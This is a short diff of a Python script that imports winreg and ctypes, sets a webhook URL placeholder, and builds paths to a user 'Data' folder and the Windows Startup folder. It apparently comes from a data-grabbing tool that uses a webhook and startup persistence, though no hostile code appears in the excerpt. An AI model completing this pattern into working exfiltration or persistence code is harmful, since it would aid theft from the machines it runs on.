@@ -30,7 +30,8 @@ import ctypes
 import winreg as wrg
 
 
-webhookurl=''
+
+#Webhookurl goies here dont edit
 userhome = os.path.expanduser('~')
 folderdir=os.path.join(userhome,'Data')
 startfolder = os.path.join(userhome, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
